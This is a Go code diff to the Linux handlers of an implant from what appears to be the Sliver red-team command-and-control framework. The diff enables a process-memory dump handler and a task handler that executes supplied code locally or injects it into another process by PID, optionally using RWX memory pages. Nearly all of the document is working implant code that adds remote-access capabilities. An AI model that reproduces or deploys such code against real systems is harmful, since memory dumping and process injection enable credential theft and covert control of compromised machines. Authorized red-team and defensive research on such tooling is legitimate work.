@@ -19,15 +19,19 @@ package handlers
 */
 
 import (
-	"github.com/bishopfox/sliver/protobuf/commonpb"
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"google.golang.org/protobuf/proto"
+	"fmt"
 	"io/fs"
 	"os"
 	"os/user"
 	"path/filepath"
 	"strconv"
 	"syscall"
+
+	"github.com/bishopfox/sliver/implant/sliver/procdump"
+	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
+	"github.com/bishopfox/sliver/protobuf/commonpb"
+	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"google.golang.org/protobuf/proto"
 
 	// {{if .Config.Debug}}
 	"log"
@@ -47,12 +51,12 @@ var (
 		sliverpb.MsgRmReq:        rmHandler,
 		sliverpb.MsgMkdirReq:     mkdirHandler,
 		sliverpb.MsgMvReq:        mvHandler,
-		// sliverpb.MsgTaskReq:      taskHandler,
-		sliverpb.MsgIfconfigReq: ifconfigHandler,
-		sliverpb.MsgExecuteReq:  executeHandler,
-		sliverpb.MsgEnvReq:      getEnvHandler,
-		sliverpb.MsgSetEnvReq:   setEnvHandler,
-		sliverpb.MsgUnsetEnvReq: unsetEnvHandler,
+		sliverpb.MsgTaskReq:      taskHandler,
+		sliverpb.MsgIfconfigReq:  ifconfigHandler,
+		sliverpb.MsgExecuteReq:   executeHandler,
+		sliverpb.MsgEnvReq:       getEnvHandler,
+		sliverpb.MsgSetEnvReq:    setEnvHandler,
+		sliverpb.MsgUnsetEnvReq:  unsetEnvHandler,
 
 		sliverpb.MsgScreenshotReq: screenshotHandler,
 
@@ -61,7 +65,7 @@ var (
 
 		sliverpb.MsgReconfigureReq: reconfigureHandler,
 		sliverpb.MsgSSHCommandReq:  runSSHCommandHandler,
-		// sliverpb.MsgProcessDumpReq: dumpHandler,
+		sliverpb.MsgProcessDumpReq: dumpHandler,
 
 		// Wasm Extensions - Note that execution can be done via a tunnel handler
 		sliverpb.MsgRegisterWasmExtensionReq:   registerWasmExtensionHandler,
@@ -88,6 +92,45 @@ var (
 // GetSystemHandlers - Returns a map of the linux system handlers
 func GetSystemHandlers() map[uint32]RPCHandler {
 	return linuxHandlers
+}
+
+func dumpHandler(data []byte, resp RPCResponse) {
+	procDumpReq := &sliverpb.ProcessDumpReq{}
+	err := proto.Unmarshal(data, procDumpReq)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+	res, err := procdump.DumpProcess(procDumpReq.Pid)
+	dumpResp := &sliverpb.ProcessDump{Data: res.Data()}
+	if err != nil {
+		dumpResp.Response = &commonpb.Response{
+			Err: fmt.Sprintf("%v", err),
+		}
+	}
+	data, err = proto.Marshal(dumpResp)
+	resp(data, err)
+}
+
+func taskHandler(data []byte, resp RPCResponse) {
+	var err error
+	task := &sliverpb.TaskReq{}
+	err = proto.Unmarshal(data, task)
+	if err != nil {
+		// {{if .Config.Debug}}
+		log.Printf("error decoding message: %v", err)
+		// {{end}}
+		return
+	}
+
+	if task.Pid == 0 {
+		err = taskrunner.LocalTask(task.Data, task.RWXPages)
+	} else {
+		err = taskrunner.RemoteTask(int(task.Pid), task.Data, task.RWXPages)
+	}
+	resp([]byte{}, err)
 }
 
 func getUid(fileInfo os.FileInfo) string {
